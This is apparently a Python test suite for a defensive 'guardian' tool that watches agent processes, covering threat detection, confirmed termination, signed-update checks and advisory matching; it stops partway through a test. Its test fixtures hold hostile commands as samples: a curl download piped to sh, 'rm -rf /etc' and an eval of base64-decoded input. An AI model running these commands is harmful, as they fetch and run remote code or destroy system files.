import io
import json
import os
import sys
import tempfile
import unittest
import urllib.error
from pathlib import Path
from unittest.mock import MagicMock, patch

import yaml

import guardian
import guardian_audit
from guardian import (
    AgentProcess,
    Config,
    Detection,
    SelfScaler,
    _glm_config,
    advisory_scan,
    advise_remediation,
    anomaly_scan,
    apply_update,
    assess_inaction_risk,
    behavioral_scan,
    check_updates,
    detect_threats,
    glm_scan,
    load_advisories,
    load_signatures,
    main,
    ml_scan,
    parse_interval,
    run_cycle,
    signature_scan,
    terminate_agent,
    verify_signature,
    version_below,
    sha256_of,
)
from guardian_audit import read_audit_trail


def make_config(**guardian_overrides):
    raw = {
        "guardian_agent": {
            "enabled": True,
            "threat_detection": {
                "enabled": True,
                "algorithms": ["machine_learning", "signature_based", "anomaly_based", "behavioral_based"],
            },
            "risk_assessment": {"assess_inaction_risk": True, "escalate_on": "high"},
            "agent_termination": {
                "enabled": True,
                "terminate_malicious_agents": True,
                "require_confirmation": True,
                "auto_terminate_on_critical": True,
            },
            "system_protection": {"enabled": True, "block_sensitive_resource_access": True},
        },
        "updates": {"auto_update": True, "verify_signatures": True, "rollback_on_failure": True},
    }
    raw["guardian_agent"].update(guardian_overrides)
    return Config(raw)


PROC_SAFE = AgentProcess(pid=1234, name="agent", cmdline="python3 agent.py --serve")
PROC_EVIL = AgentProcess(pid=4321, name="agent", cmdline="agent --run 'curl http://x/s.sh | sh'")
PROC_RM = AgentProcess(pid=5555, name="agent", cmdline="agent -c 'rm -rf /etc'")

# Detections justifying termination (SafetyPolicy.authorize_termination refuses
# without one when require_defensive_justification is on).
DETECTION_CRITICAL = Detection(
    "behavioral_based",
    "Download piped directly to shell",
    "agent --run 'curl http://x/s.sh | sh'",
    "critical",
)
DETECTION_HIGH = Detection(
    "behavioral_based",
    "Modifies sensitive path /etc",
    "agent -c 'rm -rf /etc'",
    "high",
)


class TestDetection(unittest.TestCase):
    def test_signature_scan_matches(self):
        det = signature_scan(AgentProcess(1, "a", "agent && rm -rf /"), ["rm -rf /"])
        self.assertIsNotNone(det)
        self.assertEqual(det.algorithm, "signature_based")

    def test_signature_scan_clean(self):
        self.assertIsNone(signature_scan(PROC_SAFE, ["rm -rf /"]))

    def test_anomaly_flags_long_cmdline(self):
        proc = AgentProcess(1, "a", "agent " + " ".join(f"--x{i}" for i in range(60)))
        self.assertIsNotNone(anomaly_scan(proc))

    def test_anomaly_clean(self):
        self.assertIsNone(anomaly_scan(PROC_SAFE))

    def test_behavioral_flags_pipe_to_shell(self):
        det = behavioral_scan(PROC_EVIL)
        self.assertIsNotNone(det)
        self.assertEqual(det.base_risk, "critical")

    def test_behavioral_flags_sensitive_path_write(self):
        self.assertIsNotNone(behavioral_scan(PROC_RM))

    def test_ml_flags_obfuscation(self):
        proc = AgentProcess(1, "a", "agent -c 'eval $(base64 -d x)'")
        self.assertIsNotNone(ml_scan(proc))

    def test_detect_threats_runs_all_algorithms(self):
        findings = detect_threats(PROC_EVIL, make_config(), ["curl"])
        algos = {f.algorithm for f in findings}
        self.assertIn("behavioral_based", algos)
        self.assertIn("signature_based", algos)


class TestRiskAssessment(unittest.TestCase):
    def test_pipe_to_shell_is_critical_inaction_risk(self):
        det = behavioral_scan(PROC_EVIL)
        self.assertEqual(assess_inaction_risk(det, make_config()), "critical")

    def test_signature_match_is_high(self):
        det = signature_scan(AgentProcess(1, "a", "agent && rm -rf /"), ["rm -rf /"])
        self.assertEqual(assess_inaction_risk(det, make_config()), "high")

    def test_disabled_assessment_keeps_base_risk(self):
        cfg = make_config(risk_assessment={"assess_inaction_risk": False, "escalate_on": "high"})
        det = signature_scan(AgentProcess(1, "a", "agent && rm -rf /"), ["rm -rf /"])
        self.assertEqual(assess_inaction_risk(det, cfg), "high")

    def test_risk_ordering(self):
        cfg = make_config()
        self.assertTrue(cfg.risk_at_least("critical", "high"))
        self.assertFalse(cfg.risk_at_least("medium", "high"))


class TestTermination(unittest.TestCase):
    def test_critical_bypasses_confirmation(self):
        with patch("guardian.proc_kill") as kill:
            self.assertTrue(
                terminate_agent(PROC_EVIL, "critical", make_config(), detection=DETECTION_CRITICAL)
            )
            kill.assert_called_once_with(PROC_EVIL.pid)

    def test_high_requires_confirmation_declined(self):
        """Confirmation path: a justified high-risk termination the operator
        declines returns False, never kills, and the decline is audited."""
        with tempfile.TemporaryDirectory() as d:
            log = Path(d) / "audit.log"
            with patch.object(guardian_audit, "AUDIT_LOG_PATH", log), \
                 patch("builtins.input", return_value="n"), \
                 patch("guardian.proc_kill") as kill:
                self.assertFalse(
                    terminate_agent(PROC_RM, "high", make_config(), detection=DETECTION_HIGH)
                )
                kill.assert_not_called()
            declines = [e for e in read_audit_trail(log, action_type="termination")
                        if "Termination declined" in e["description"]]
            self.assertEqual(len(declines), 1)
            self.assertEqual(declines[0]["agent_id"], str(PROC_RM.pid))
            self.assertEqual(declines[0]["risk_level"], "high")

    def test_high_requires_confirmation_accepted(self):
        with patch("builtins.input", return_value="y"), patch("guardian.proc_kill") as kill:
            self.assertTrue(
                terminate_agent(PROC_RM, "high", make_config(), detection=DETECTION_HIGH)
            )
            kill.assert_called_once()

    def test_dry_run_never_kills(self):
        with patch("guardian.proc_kill") as kill:
            self.assertTrue(
                terminate_agent(PROC_EVIL, "critical", make_config(),
                                detection=DETECTION_CRITICAL, dry_run=True)
            )
            kill.assert_not_called()

    def test_no_detection_is_refused_and_audited(self):
        """Refusal path: termination without a justifying detection is blocked
        by SafetyPolicy.require_defensive_justification and logged as a
        SAFETY REFUSAL protection entry."""
        with tempfile.TemporaryDirectory() as d:
            log = Path(d) / "audit.log"
            with patch.object(guardian_audit, "AUDIT_LOG_PATH", log), \
                 patch("guardian.proc_kill") as kill:
                self.assertFalse(terminate_agent(PROC_EVIL, "critical", make_config()))
                kill.assert_not_called()
            refusals = [e for e in read_audit_trail(log, action_type="protection")
                        if "SAFETY REFUSAL" in e["description"]]
            self.assertEqual(len(refusals), 1)
            self.assertIn("no detection justifies this action", refusals[0]["description"])

    def test_termination_disabled(self):
        cfg = make_config(agent_termination={"enabled": False, "terminate_malicious_agents": True})
        with patch("guardian.proc_kill") as kill:
            self.assertFalse(terminate_agent(PROC_EVIL, "critical", cfg))
            kill.assert_not_called()


class TestUpdates(unittest.TestCase):
    def setUp(self):
        self.tmp = tempfile.TemporaryDirectory()
        self.dir = Path(self.tmp.name)
        self.old_cwd = Path.cwd()
        import os
        os.chdir(self.dir)

    def tearDown(self):
        import os
        os.chdir(self.old_cwd)
        self.tmp.cleanup()

    def make_update(self, content=b"payload", sign=True):
        f = self.dir / "update.sh"
        f.write_bytes(content)
        if sign:
            f.with_suffix(".sh.sig").write_text(sha256_of(f))
        return f

    def test_verify_signature_ok(self):
        f = self.make_update()
        self.assertTrue(verify_signature(f, f.with_suffix(".sh.sig")))

    def test_verify_signature_missing(self):
        f = self.make_update(sign=False)
        self.assertFalse(verify_signature(f, f.with_suffix(".sh.sig")))

    def test_verify_signature_tampered(self):
        f = self.make_update()
        f.write_bytes(b"tampered")
        self.assertFalse(verify_signature(f, f.with_suffix(".sh.sig")))

    def test_unsigned_update_quarantined(self):
        f = self.make_update(sign=False)
        self.assertFalse(apply_update(f, make_config()))
        self.assertFalse(f.exists())
        self.assertTrue((self.dir / "quarantine" / "update.sh").exists())

    def test_unsigned_update_audit_says_unsigned(self):
        f = self.make_update(sign=False)
        log = self.dir / "audit.log"
        with patch.object(guardian_audit, "AUDIT_LOG_PATH", log):
            self.assertFalse(apply_update(f, make_config()))
        actions = [a["description"] for a in read_audit_trail(log, action_type="update")]
        self.assertTrue(any("Rejected unsigned update" in a for a in actions))

    def test_invalid_signature_update_quarantined(self):
        f = self.make_update()
        f.write_bytes(b"tampered")
        log = self.dir / "audit.log"
        with patch.object(guardian_audit, "AUDIT_LOG_PATH", log):
            self.assertFalse(apply_update(f, make_config()))
        self.assertFalse(f.exists())
        self.assertTrue((self.dir / "quarantine" / "update.sh").exists())

    def test_invalid_signature_update_audit_distinguishes_tampering(self):
        f = self.make_update()
        f.write_bytes(b"tampered")
        log = self.dir / "audit.log"
        with patch.object(guardian_audit, "AUDIT_LOG_PATH", log):
            self.assertFalse(apply_update(f, make_config()))
        actions = [a["description"] for a in read_audit_trail(log, action_type="update")]
        self.assertTrue(any("invalid signature" in a for a in actions))
        self.assertFalse(any("Rejected unsigned update" in a for a in actions))

    def test_signed_update_applied(self):
        f = self.make_update()
        self.assertTrue(apply_update(f, make_config()))
        self.assertTrue(f.exists())

    def test_rollback_on_failure_snapshots_backup(self):
        """updates.rollback_on_failure snapshots the file into backups/ before
        staging. NOTE: the current apply step is a stub
        (``applied_ok = file_path.exists()``), so the restore-from-backup
        branch is unreachable until a real apply step lands — this test covers
        the backup-creation behavior only."""
        f = self.make_update()
        self.assertTrue(apply_update(f, make_config()))
        backup = self.dir / "backups" / "update.sh"
        self.assertTrue(backup.exists())
        self.assertEqual(backup.read_bytes(), b"payload")

    def test_no_backup_when_rollback_disabled(self):
        cfg = make_config()
        cfg.raw["updates"]["rollback_on_failure"] = False
        f = self.make_update()
        self.assertTrue(apply_update(f, cfg))
        self.assertFalse((self.dir / "backups" / "update.sh").exists())


class TestCheckUpdates(unittest.TestCase):
    def setUp(self):
        import os
        self.tmp = tempfile.TemporaryDirectory()
        self.dir = Path(self.tmp.name)
        self.old_cwd = os.getcwd()
        os.chdir(self.dir)
        self.inbox = self.dir / "updates" / "inbox"
        self.inbox.mkdir(parents=True)

    def tearDown(self):
        import os
        os.chdir(self.old_cwd)
        self.tmp.cleanup()

    def drop_update(self, name, content=b"payload", sign=True):
        f = self.inbox / name
        f.write_bytes(content)
        if sign:
            f.with_suffix(f.suffix + ".sig").write_text(sha256_of(f))
        return f

    def test_signed_update_applied_automatically(self):
        self.drop_update("a.sh")
        self.assertEqual(check_updates(make_config()), 1)

    def test_unsigned_update_quarantined_not_applied(self):
        self.drop_update("evil.sh", sign=False)
        self.assertEqual(check_updates(make_config()), 0)
        self.assertFalse((self.inbox / "evil.sh").exists())
        self.assertTrue((self.dir / "quarantine" / "evil.sh").exists())

    def test_signature_files_not_treated_as_updates(self):
        self.drop_update("a.sh")
        self.drop_update("b.sh", content=b"other")
        self.assertEqual(check_updates(make_config()), 2)
        # .sig sidecars must be left alone: still in the inbox, never quarantined.
        for name in ("a.sh.sig", "b.sh.sig"):
            self.assertTrue((self.inbox / name).exists())
            self.assertFalse((self.dir / "quarantine" / name).exists())

    def test_missing_inbox_is_noop(self):
        import shutil
        shutil.rmtree(self.inbox)
        self.assertEqual(check_updates(make_config()), 0)

    def test_empty_inbox_is_noop(self):
        self.assertEqual(check_updates(make_config()), 0)

    def test_auto_update_disabled_refuses_and_audits(self):
        self.drop_update("a.sh")
        cfg = make_config()
        cfg.raw["updates"]["auto_update"] = False
        log = self.dir / "audit.log"
        with patch.object(guardian_audit, "AUDIT_LOG_PATH", log):
            self.assertEqual(check_updates(cfg), 0)
        self.assertTrue((self.inbox / "a.sh").exists())  # untouched
        actions = [a["description"] for a in read_audit_trail(log, action_type="update")]
        self.assertTrue(any("auto_update is false" in a for a in actions))

    def test_update_sweep_is_audited(self):
        self.drop_update("a.sh")
        log = self.dir / "audit.log"
        with patch.object(guardian_audit, "AUDIT_LOG_PATH", log):
            check_updates(make_config())
        actions = [a["description"] for a in read_audit_trail(log, action_type="update")]
        self.assertTrue(any("Applied update a.sh" in a for a in actions))
        self.assertTrue(any("Update check complete: 1/1 applied" in a for a in actions))

    def test_dry_run_logs_without_applying(self):
        f = self.drop_update("a.sh")
        self.assertEqual(check_updates(make_config(), dry_run=True), 1)
        self.assertTrue(f.exists())
        self.assertFalse((self.dir / "backups" / "a.sh").exists())


class TestParseInterval(unittest.TestCase):
    def test_units(self):
        self.assertEqual(parse_interval("45m"), 2700.0)
        self.assertEqual(parse_interval("30s"), 30.0)
        self.assertEqual(parse_interval("1h"), 3600.0)
        self.assertEqual(parse_interval("2d"), 172800.0)

    def test_plain_seconds(self):
        self.assertEqual(parse_interval("90"), 90.0)
        self.assertEqual(parse_interval(120), 120.0)

    def test_garbage_falls_back_to_default(self):
        self.assertEqual(parse_interval("soon", default=7.0), 7.0)
        self.assertEqual(parse_interval(None, default=3.0), 3.0)

    def test_non_finite_falls_back_to_default(self):
        self.assertEqual(parse_interval("nan", default=7.0), 7.0)
        self.assertEqual(parse_interval("inf", default=7.0), 7.0)
        self.assertEqual(parse_interval(float("nan"), default=7.0), 7.0)
        self.assertEqual(parse_interval(float("inf"), default=7.0), 7.0)

    def test_negative_falls_back_to_default(self):
        self.assertEqual(parse_interval("-5", default=7.0), 7.0)
        self.assertEqual(parse_interval(-5, default=7.0), 7.0)


class TestMainUpdates(unittest.TestCase):
    def test_once_calls_check_updates_even_when_auto_update_disabled(self):
        """main() must not gate check_updates() on auto_update — the function
        audits its own skip, so gating upstream would swallow the audit entry."""
        with tempfile.TemporaryDirectory() as d:
            log = Path(d) / "audit.log"
            with patch.object(guardian_audit, "AUDIT_LOG_PATH", log), \
                 patch("guardian.AgentProcess.scan", return_value=[]), \
                 patch("guardian.resolve_norton_signatures", return_value=[]), \
                 patch("guardian.load_signatures", return_value=[]):
                cfg = self._write_config(d, auto_update=False)
                self.assertEqual(guardian.main(["--config", cfg, "--once"]), 0)
            actions = [a["description"] for a in read_audit_trail(log, action_type="update")]
            self.assertTrue(any("auto_update is false" in a for a in actions))

    def test_once_no_updates_flag_skips_sweep_entirely(self):
        """--no-updates opts out of the sweep: no update audit entries at all."""
        with tempfile.TemporaryDirectory() as d:
            log = Path(d) / "audit.log"
            with patch.object(guardian_audit, "AUDIT_LOG_PATH", log), \
                 patch("guardian.AgentProcess.scan", return_value=[]), \
                 patch("guardian.resolve_norton_signatures", return_value=[]), \
                 patch("guardian.load_signatures", return_value=[]):
                cfg = self._write_config(d, auto_update=True)
                self.assertEqual(guardian.main(["--config", cfg, "--once", "--no-updates"]), 0)
            self.assertEqual(read_audit_trail(log, action_type="update"), [])

    def _write_config(self, d, *, auto_update):
        cfg = Path(d) / "Guardian.yaml"
        cfg.write_text(yaml.safe_dump({
            "guardian_agent": {"enabled": True},
            "updates": {"auto_update": auto_update},
        }))
        return str(cfg)


class TestSignaturesDB(unittest.TestCase):
    def test_loads_from_db(self):
        with tempfile.TemporaryDirectory() as d:
            p = Path(d) / "sigs.json"
            p.write_text(json.dumps({"signatures": ["evil-cmd"]}))
            self.assertEqual(load_signatures(p), ["evil-cmd"])

    def test_falls_back_to_defaults(self):
        sigs = load_signatures(Path("/nonexistent.json"))
        self.assertIn("rm -rf /", sigs)


ADVISORY_FEED = {
    "advisories": [
        {"id": "CVE-2099-0001", "severity": "high", "match": "logsvc",
         "summary": "logsvc remote code execution before 2.4.1",
         "affected_below": "2.4.1", "fixed_version": "2.4.1",
         "recommendation": "Update logsvc to 2.4.1 or later."},
        {"id": "CVE-2099-0002", "severity": "low", "match": "agent",
         "summary": "agent framework info leak (all versions)",
         "recommendation": "Restrict agent log output."},
        {"id": "BAD-NO-MATCH", "severity": "high"},
        {"severity": "high", "match": "x"},
        {"id": "BAD-SEVERITY", "severity": "apocalyptic", "match": "y"},
    ]
}


class TestAdvisoryFeed(unittest.TestCase):
    def setUp(self):
        self.tmp = tempfile.TemporaryDirectory()
        self.dir = Path(self.tmp.name)

    def tearDown(self):
        self.tmp.cleanup()

    def write_feed(self, data=None):
        feed = self.dir / "advisories.json"
        feed.write_text(json.dumps(ADVISORY_FEED if data is None else data))
        return feed

    def test_loads_valid_feed(self):
        with patch.object(guardian_audit, "AUDIT_LOG_PATH", self.dir / "audit.log"):
            advisories = load_advisories(self.write_feed())
        ids = [a["id"] for a in advisories]
        self.assertEqual(ids, ["CVE-2099-0001", "CVE-2099-0002"])

    def test_missing_feed_returns_empty_and_audits(self):
        log = self.dir / "audit.log"
        with patch.object(guardian_audit, "AUDIT_LOG_PATH", log):
            self.assertEqual(load_advisories(self.dir / "nope.json"), [])
        actions = [a["description"] for a in read_audit_trail(log, action_type="update")]
        self.assertTrue(any("Advisory feed not found" in a for a in actions))

    def test_invalid_json_feed_returns_empty_and_audits(self):
        feed = self.dir / "advisories.json"
        feed.write_text("{ not json")
        log = self.dir / "audit.log"
        with patch.object(guardian_audit, "AUDIT_LOG_PATH", log):
            self.assertEqual(load_advisories(feed), [])
        actions = [a["description"] for a in read_audit_trail(log, action_type="update")]
        self.assertTrue(any("not valid JSON" in a for a in actions))

    def test_min_severity_filters(self):
        with patch.object(guardian_audit, "AUDIT_LOG_PATH", self.dir / "audit.log"):
            advisories = load_advisories(self.write_feed(), min_severity="medium")
        self.assertEqual([a["id"] for a in advisories], ["CVE-2099-0001"])

    def test_malformed_entries_skipped(self):
        with patch.object(guardian_audit, "AUDIT_LOG_PATH", self.dir / "audit.log"):
            advisories = load_advisories(self.write_feed())
        ids = [a["id"] for a in advisories]
        self.assertNotIn("BAD-NO-MATCH", ids)
        self.assertNotIn("BAD-SEVERITY", ids)


class TestVersionBelow(unittest.TestCase):
    def test_lower_versions(self):
        self.assertTrue(version_below("2.3.0", "2.4.1"))
        self.assertTrue(version_below("2.4.0", "2.4.1"))
        self.assertTrue(version_below("1", "2"))

    def test_equal_and_higher_not_below(self):
        self.assertFalse(version_below("2.4.1", "2.4.1"))
        self.assertFalse(version_below("2.4.2", "2.4.1"))
        self.assertFalse(version_below("10.0", "2.4.1"))

    def test_unparseable_never_claims_vulnerable(self):
        self.assertFalse(version_below("", "2.4.1"))
        self.assertFalse(version_below("latest", "2.4.1"))
        self.assertFalse(version_below("2.3", ""))


class TestAdvisoryScan(unittest.TestCase):
    def advisories(self):
        return [
            {"id": "CVE-2099-0001", "severity": "high", "match": "logsvc",
             "summary": "", "affected_below": "2.4.1", "fixed_version": "2.4.1",
             "recommendation": "Update logsvc to 2.4.1 or later."},
            {"id": "CVE-2099-0002", "severity": "low", "match": "agent",
             "summary": "", "affected_below": "", "fixed_version": "",
             "recommendation": "Restrict agent log output."},
        ]

    def test_vulnerable_version_matches(self):
        proc = AgentProcess(pid=1, name="agent", cmdline="agent --plugin logsvc-2.3.0 --serve")
        matches = advisory_scan(proc, self.advisories())
        by_id = {m.advisory_id: m for m in matches}
        self.assertIn("CVE-2099-0001", by_id)
        self.assertEqual(by_id["CVE-2099-0001"].matched, "2.3.0")
        self.assertEqual(by_id["CVE-2099-0001"].fixed_version, "2.4.1")

    def test_patched_version_does_not_match(self):
        proc = AgentProcess(pid=1, name="agent", cmdline="agent --plugin logsvc-2.4.1 --serve")
        matches = advisory_scan(proc, self.advisories())
        self.assertNotIn("CVE-2099-0001", {m.advisory_id for m in matches})

    def test_match_without_version_gate_always_applies(self):
        proc = AgentProcess(pid=1, name="agent", cmdline="python3 agent.py --serve")
        matches = advisory_scan(proc, self.advisories())
        self.assertIn("CVE-2099-0002", {m.advisory_id for m in matches})

    def test_unrelated_process_does_not_match(self):
        proc = AgentProcess(pid=1, name="helper", cmdline="helper --idle")
        self.assertEqual(advisory_scan(proc, self.advisories()), [])

    def test_unparseable_version_with_gate_does_not_match(self):
        proc = AgentProcess(pid=1, name="agent", cmdline="agent --plugin logsvc --serve")
        matches = advisory_scan(proc, self.advisories())
        self.assertNotIn("CVE-2099-0001", {m.advisory_id for m in matches})


class TestAdviseRemediation(unittest.TestCase):
    def setUp(self):
        self.tmp = tempfile.TemporaryDirectory()
        self.dir = Path(self.tmp.name)
        self.advisories = [
            guardian.RemediationAdvisory(
                advisory_id="CVE-2099-0001", severity="high", product="logsvc",
                matched="2.3.0", fixed_version="2.4.1",
                recommendation="Update logsvc to 2.4.1 or later."),
        ]
        self.proc = AgentProcess(pid=77, name="agent",
                                 cmdline="agent --plugin logsvc-2.3.0 --serve")

    def tearDown(self):
        self.tmp.cleanup()

    def test_advisory_alerts_and_audits(self):
        log = self.dir / "audit.log"
        with patch.object(guardian_audit, "AUDIT_LOG_PATH", log):
            count = advise_remediation(self.proc, self.advisories, make_config(), set())
        self.assertEqual(count, 1)
        entries = read_audit_trail(log, action_type="escalation")
        self.assertTrue(any("CVE-2099-0001" in e["description"] for e in entries))
        self.assertTrue(any("2.4.1" in e["description"] for e in entries))
        # advisory_only marker: the response never acts on the process itself
        self.assertTrue(any(e["details"].get("action") == "advisory_only" for e in entries))
        # advisories are not terminations
        self.assertEqual(read_audit_trail(log, action_type="termination"), [])

    def test_alert_on_advisory_false_still_audits(self):
        log = self.dir / "audit.log"
        config = make_config(remediation_advisory={"enabled": True, "alert_on_advisory": False})
        with patch.object(guardian_audit, "AUDIT_LOG_PATH", log):
            count = advise_remediation(self.proc, self.advisories, config, set())
        self.assertEqual(count, 1)
        alerts = [e for e in read_audit_trail(log, action_type="escalation")
                  if e["description"].startswith("ALERT:")]
        self.assertEqual(alerts, [])
        self.assertTrue(any("CVE-2099-0001" in e["description"]
                            for e in read_audit_trail(log, action_type="escalation")))

    def test_dedup_per_pid_and_advisory(self):
        advised: set = set()
        with patch.object(guardian_audit, "AUDIT_LOG_PATH", self.dir / "audit.log"):
            self.assertEqual(advise_remediation(self.proc, self.advisories, make_config(), advised), 1)
            self.assertEqual(advise_remediation(self.proc, self.advisories, make_config(), advised), 0)

    def test_no_match_is_silent(self):
        log = self.dir / "audit.log"
        with patch.object(guardian_audit, "AUDIT_LOG_PATH", log):
            self.assertEqual(advise_remediation(self.proc, [], make_config(), set()), 0)
        self.assertEqual(read_audit_trail(log), [])


class TestAdvisoryRunCycle(unittest.TestCase):
    def test_cycle_advises_vulnerable_process(self):
        with tempfile.TemporaryDirectory() as d:
            feed = Path(d) / "advisories.json"
            feed.write_text(json.dumps({"advisories": [
                {"id": "CVE-2099-0001", "severity": "high", "match": "logsvc",
                 "affected_below": "2.4.1", "fixed_version": "2.4.1",
                 "recommendation": "Update logsvc to 2.4.1 or later."},
            ]}))
            log = Path(d) / "audit.log"
            proc = AgentProcess(pid=88, name="agent",
                                cmdline="agent --plugin logsvc-2.3.0 --serve")
            config = make_config(remediation_advisory={
                "enabled": True, "advisory_feed": str(feed)})
            with patch("guardian.AgentProcess.scan", return_value=[proc]):
                run_cycle(config, [], dry_run=True, audit_log=log)
            entries = [e for e in read_audit_trail(log, action_type="escalation")
                       if e["description"].startswith("Remediation advisory CVE-2099-0001")]
            self.assertEqual(len(entries), 1)
            self.assertEqual(entries[0]["risk_level"], "high")
            # advisory must not trigger termination
            self.assertEqual(read_audit_trail(log, action_type="termination"), [])

    def test_cycle_skips_advisories_when_disabled(self):
        with tempfile.TemporaryDirectory() as d:
            log = Path(d) / "audit.log"
            proc = AgentProcess(pid=88, name="agent",
                                cmdline="agent --plugin logsvc-2.3.0 --serve")
            config = make_config(remediation_advisory={"enabled": False})
            with patch("guardian.AgentProcess.scan", return_value=[proc]):
                run_cycle(config, [], dry_run=True, audit_log=log)
            entries = [e for e in read_audit_trail(log, action_type="escalation")
                       if "advisory" in e["description"].lower()]
            self.assertEqual(entries, [])


class TestAdvisoryCli(unittest.TestCase):
    def test_advisory_check_prints_json_and_exits(self):
        with tempfile.TemporaryDirectory() as d:
            feed = Path(d) / "advisories.json"
            feed.write_text(json.dumps({"advisories": [
                {"id": "CVE-2099-0001", "severity": "high", "match": "logsvc",
                 "affected_below": "2.4.1", "fixed_version": "2.4.1",
                 "recommendation": "Update logsvc to 2.4.1 or later."},
            ]}))
            cfg = Path(d) / "cfg.yaml"
            cfg.write_text(yaml.safe_dump({
                "guardian_agent": {
                    "enabled": True,
                    "remediation_advisory": {"enabled": True,
                                             "advisory_feed": str(feed)},
                },
            }))
            out = io.StringIO()
            with patch.object(guardian_audit, "AUDIT_LOG_PATH", Path(d) / "audit.log"), \
                 patch("sys.stdout", out):
                rc = main(["--config", str(cfg), "--advisory-check",
                           "agent --plugin logsvc-2.3.0 --serve"])
            self.assertEqual(rc, 0)
            payload = json.loads(out.getvalue())
            self.assertEqual(payload[0]["advisory_id"], "CVE-2099-0001")

    def test_advisory_check_clean_cmdline_prints_empty_list(self):
        with tempfile.TemporaryDirectory() as d:
            cfg = Path(d) / "cfg.yaml"
            cfg.write_text(yaml.safe_dump({"guardian_agent": {"enabled": True}}))
            out = io.StringIO()
            with patch.object(guardian_audit, "AUDIT_LOG_PATH", Path(d) / "audit.log"), \
                 patch("sys.stdout", out):
                rc = main(["--config", str(cfg), "--advisory-check", "agent --serve"])
            self.assertEqual(rc, 0)
            self.assertEqual(json.loads(out.getvalue()), [])


class TestRunCycle(unittest.TestCase):
    def test_cycle_detects_escalates_and_logs(self):
        with tempfile.TemporaryDirectory() as d:
            log = Path(d) / "audit.log"
            with patch("guardian.AgentProcess.scan", return_value=[PROC_EVIL]), \
                 patch("guardian.proc_kill"):
                acted = run_cycle(make_config(), ["curl"], dry_run=True, audit_log=log)
            self.assertGreaterEqual(acted, 1)
            entries = read_audit_trail(log)
            types = {e["action_type"] for e in entries}
            self.assertIn("detection", types)
            self.assertIn("escalation", types)

    def test_cycle_ignores_safe_processes(self):
        with tempfile.TemporaryDirectory() as d:
            log = Path(d) / "audit.log"
            with patch("guardian.AgentProcess.scan", return_value=[PROC_SAFE]):
                acted = run_cycle(make_config(), ["rm -rf /"], dry_run=True, audit_log=log)
            self.assertEqual(acted, 0)



class TestSelfScaling(unittest.TestCase):
    """Guardian splits into as many spawns as the threat load needs —
    not always max_agents — bounded by threshold, cooldown, and the cap."""

    def make_scaler(self, log: Path, **overrides) -> SelfScaler:
        section = {"enabled": True, "split_threshold": 3, "min_agents": 1,
                   "max_agents": 8, "cooldown_cycles": 2}
        section.update(overrides)
        cfg = make_config(self_scaling=section)
        return SelfScaler(cfg)

    def test_disabled_never_splits(self):
        scaler = SelfScaler(make_config())  # no self_scaling section
        self.assertFalse(scaler.enabled())
        with patch("guardian.subprocess.Popen") as popen:
            self.assertEqual(scaler.maybe_split(99, scan_pattern="agent", dry_run=True), 0)
            popen.assert_not_called()

    def test_scales_to_threat_count_not_always_max(self):
        with tempfile.TemporaryDirectory() as d:
            log = Path(d) / "audit.log"
            scaler = self.make_scaler(log)
            child = MagicMock()
            child.poll.return_value = None
            with patch.object(guardian_audit, "AUDIT_LOG_PATH", log), \
                 patch("guardian.subprocess.Popen", return_value=child) as popen:
                # 4 threats => 4 guardians total: 1 parent + 3 spawns (not 8)
                spawned = scaler.maybe_split(4, scan_pattern="agent", dry_run=True)
            self.assertEqual(spawned, 3)
            self.assertEqual(popen.call_count, 3)
            for call in popen.call_args_list:
                cmd = call.args[0]
                self.assertIn("--once", cmd)
                self.assertIn("--dry-run", cmd)
                self.assertIn("agent", cmd)
            escalations = [e for e in read_audit_trail(log, action_type="escalation")
                           if "Self-scaling" in e["description"]]
            self.assertEqual(len(escalations), 1)
            self.assertEqual(escalations[0]["details"]["threat_count"], 4)

    def test_split_capped_at_max_agents(self):
        with tempfile.TemporaryDirectory() as d:
            log = Path(d) / "audit.log"
            scaler = self.make_scaler(log, max_agents=5)
            child = MagicMock()
            child.poll.return_value = None
            with patch.object(guardian_audit, "AUDIT_LOG_PATH", log), \
                 patch("guardian.subprocess.Popen", return_value=child) as popen:
                spawned = scaler.maybe_split(20, scan_pattern="agent", dry_run=True)
            self.assertEqual(spawned, 4)  # 5 total: 1 parent + 4 spawns
            self.assertEqual(popen.call_count, 4)

    def test_below_threshold_does_not_split(self):
        with tempfile.TemporaryDirectory() as d:
            log = Path(d) / "audit.log"
            scaler = self.make_scaler(log, split_threshold=3)
            with patch("guardian.subprocess.Popen") as popen:
                self.assertEqual(scaler.maybe_split(2, scan_pattern="agent", dry_run=True), 0)
                popen.assert_not_called()

    def test_cooldown_blocks_immediate_resplit(self):
        with tempfile.TemporaryDirectory() as d:
            log = Path(d) / "audit.log"
            scaler = self.make_scaler(log, cooldown_cycles=2)
            child = MagicMock()
            child.poll.return_value = None
            with patch.object(guardian_audit, "AUDIT_LOG_PATH", log), \
                 patch("guardian.subprocess.Popen", return_value=child) as popen:
                self.assertEqual(scaler.maybe_split(4, scan_pattern="agent", dry_run=True), 3)
                self.assertEqual(popen.call_count, 3)
                popen.reset_mock()
                for _ in range(2):  # cooldown cycles
                    self.assertEqual(scaler.maybe_split(8, scan_pattern="agent", dry_run=True), 0)
                    popen.assert_not_called()
                # cooldown expired; 8 threats - (1 parent + 3 active spawns) = 4 more
                self.assertEqual(scaler.maybe_split(8, scan_pattern="agent", dry_run=True), 4)
                self.assertEqual(popen.call_count, 4)

    def test_dead_spawns_are_not_counted(self):
        with tempfile.TemporaryDirectory() as d:
            log = Path(d) / "audit.log"
            scaler = self.make_scaler(log, cooldown_cycles=0)
            alive = MagicMock()
            alive.poll.return_value = None
            dead = MagicMock()
            dead.poll.return_value = 0  # exited
            with patch.object(guardian_audit, "AUDIT_LOG_PATH", log), \
                 patch("guardian.subprocess.Popen", return_value=alive) as popen:
                scaler.active_spawns = [dead]
                # maybe_split returns newly created spawns; dead spawn pruned first,
                # so 3 threats => 3 total - 1 parent = 2 new spawns
                spawned = scaler.maybe_split(3, scan_pattern="agent", dry_run=True)
            self.assertEqual(spawned, 2)
            self.assertEqual(popen.call_count, 2)
            self.assertNotIn(dead, scaler.active_spawns)  # dead spawn pruned
            self.assertEqual(scaler.active_spawns, [alive, alive])

    def test_live_mode_split_omits_dry_run_flag(self):
        with tempfile.TemporaryDirectory() as d:
            log = Path(d) / "audit.log"
            scaler = self.make_scaler(log)
            child = MagicMock()
            child.poll.return_value = None
            with patch.object(guardian_audit, "AUDIT_LOG_PATH", log), \
                 patch("guardian.subprocess.Popen", return_value=child) as popen:
                scaler.maybe_split(3, scan_pattern="agent", dry_run=False)
            popen.assert_called()  # split triggers at threat_count == threshold
            cmd = popen.call_args.args[0]
            self.assertNotIn("--dry-run", cmd)

    def test_run_cycle_invokes_scaler_with_detection_count(self):
